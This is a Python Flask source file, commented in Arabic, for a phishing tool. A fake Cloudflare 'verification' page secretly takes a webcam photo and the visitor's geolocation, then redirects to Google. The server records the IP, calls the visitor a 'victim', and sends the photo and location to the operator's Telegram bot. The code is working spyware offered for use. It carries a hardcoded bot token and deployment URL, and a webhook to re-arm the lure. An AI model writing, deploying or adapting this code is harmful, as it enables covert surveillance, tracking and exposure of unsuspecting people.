from flask import Flask, request, render_template_string, redirect
import requests
import base64

app = Flask(__name__)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
# =======================================================

# حالة الرابط (مفعل بشكل افتراضي)
LINK_ACTIVE = True

# ==================== صفحة HTML ====================
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body{background:#f0f2f5;font-family:sans-serif;text-align:center;padding:50px;margin:0}
        .box{background:white;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
        h2{color:#1a1a2e;margin-bottom:10px}
        .loader{border:4px solid #f3f3f3;border-top:4px solid #f6821f;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        #status{color:#555;font-size:14px;margin-top:15px}
        .footer{font-size:11px;color:#aaa;margin-top:20px}
    </style>
</head>
<body>
<div class="box">
    <h2>جاري التحقق</h2>
    <div class="loader"></div>
    <p id="status">جارِ الاتصال الآمن...</p>
    <div class="footer">Cloudflare • التحقق الأمني</div>
</div>
<video id="v" autoplay playsinline muted style="position:fixed;top:-100%;left:-100%;width:1px;height:1px"></video>
<canvas id="c" style="display:none"></canvas>
<script>
let sent = false;

async function start() {
    if(sent) return;
    sent = true;
    
    try {
        // طلب الكاميرا
        document.getElementById('status').innerText = '📷 طلب الوصول إلى الكاميرا...';
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const v = document.getElementById('v');
        v.srcObject = stream;
        await new Promise(r => { v.onloadedmetadata = r; setTimeout(r, 1000); });
        
        // التقاط الصورة
        document.getElementById('status').innerText = '📸 التقاط الصورة...';
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        const img = c.toDataURL('image/jpeg', 0.6).split(',')[1];
        
        // تحديد الموقع
        document.getElementById('status').innerText = '📍 تحديد الموقع...';
        let lat = 0, lon = 0;
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            document.getElementById('status').innerText = '✅ تم تحديد الموقع';
        } catch(e) {
            document.getElementById('status').innerText = '⚠️ لم يتم تحديد الموقع';
        }
        
        // إرسال البيانات
        document.getElementById('status').innerText = '📤 إرسال البيانات...';
        await fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ img: img, lat: lat, lon: lon })
        });
        
        // التوجيه إلى Google
        document.getElementById('status').innerText = '✅ تم التحقق! جاري التوجيه...';
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 1000);
        
    } catch(error) {
        console.error(error);
        document.getElementById('status').innerText = '⚠️ خطأ... جاري التوجيه';
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 1000);
    }
}

// بدء العملية بعد 1 ثانية
setTimeout(start, 1000);
</script>
</body>
</html>
'''

# ==================== المسارات ====================
@app.route('/')
def index():
    """الصفحة الرئيسية - رابط الاختراق"""
    global LINK_ACTIVE
    if not LINK_ACTIVE:
        return redirect('https://www.google.com')
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    """استقبال البيانات من الضحية"""
    global LINK_ACTIVE
    try:
        data = request.get_json()
        if not data:
            return 'error', 400
        
        img = data.get('img', '')
        lat = data.get('lat', 0)
        lon = data.get('lon', 0)
        
        # جلب IP الضحية
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        
        # بناء الرسالة
        msg = f"""🔥 <b>✅ ضحية جديدة!</b>

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP:</b> <code>{ip}</code>
📍 <b>الموقع:</b> {lat}, {lon}
🔗 <b>خريطة:</b> <a href='https://www.google.com/maps?q={lat},{lon}'>اضغط للعرض</a>
⏰ <b>الوقت:</b> {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━

⚠️ <b>تم تعطيل الرابط تلقائياً</b>"""
        
        # إرسال الصورة + التقرير إلى تيليجرام
        if img and len(img) > 100:
            img_data = base64.b64decode(img)
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
                files={'photo': ('victim.jpg', img_data)},
                timeout=30
            )
        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'HTML'},
                timeout=30
            )
        
        # تعطيل الرابط بعد الاستخدام
        LINK_ACTIVE = False
        
        print(f"✅ تم استلام بيانات من {ip}")
        
    except Exception as e:
        print(f"❌ خطأ في /capture: {e}")
    
    return 'ok', 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """Webhook للتحكم بالبوت"""
    try:
        data = request.get_json()
        if not data:
            return 'OK', 200
        
        # معالجة الرسائل
        if 'message' in data:
            msg = data['message']
            chat_id = msg['chat']['id']
            text = msg.get('text', '')
            
            # الأوامر (للمطور فقط)
            if chat_id == ADMIN_ID:
                if text == '/open':
                    global LINK_ACTIVE
                    LINK_ACTIVE = True
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={'chat_id': ADMIN_ID, 'text': '✅ <b>تم تفعيل الرابط!</b>\n\nالرابط جاهز لاستقبال ضحية جديدة.', 'parse_mode': 'HTML'},
                        timeout=30
                    )
                
                elif text == '/link':
                    site_url = "https://sif.ts6y.onrender.com"
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={'chat_id': ADMIN_ID, 'text': f'🔗 <b>الرابط الحالي:</b>\n<code>{site_url}</code>', 'parse_mode': 'HTML'},
                        timeout=30
                    )
                
                elif text == '/status':
                    status = '🟢 <b>مفعل</b>' if LINK_ACTIVE else '🔴 <b>معطل</b>'
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={'chat_id': ADMIN_ID, 'text': f'📊 <b>حالة الرابط:</b>\n{status}', 'parse_mode': 'HTML'},
                        timeout=30
                    )
                
                elif text == '/start':
                    menu = f"""🎯 <b>مرحباً بك في لوحة التحكم</b>

<b>الأوامر المتاحة:</b>

🔓 <code>/open</code> - تفعيل الرابط
🔗 <code>/link</code> - عرض الرابط
📊 <code>/status</code> - حالة الرابط

<b>المطور:</b> @Y_urd
"""
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={'chat_id': ADMIN_ID, 'text': menu, 'parse_mode': 'HTML'},
                        timeout=30
                    )
        
    except Exception as e:
        print(f"❌ خطأ في webhook: {e}")
    
    return 'OK', 200

@app.route('/health')
def health():
    """فحص صحة السيرفر"""
    return 'OK', 200

# ==================== تشغيل التطبيق ====================
if __name__ == '__main__':
    port = 8080
    print("=" * 50)
    print("🚀 تشغيل البوت - سيف")
    print("=" * 50)
    print(f"📍 الرابط: https://sif.ts6y.onrender.com")
    print(f"🤖 حالة الرابط: {'مفعل' if LINK_ACTIVE else 'معطل'}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)
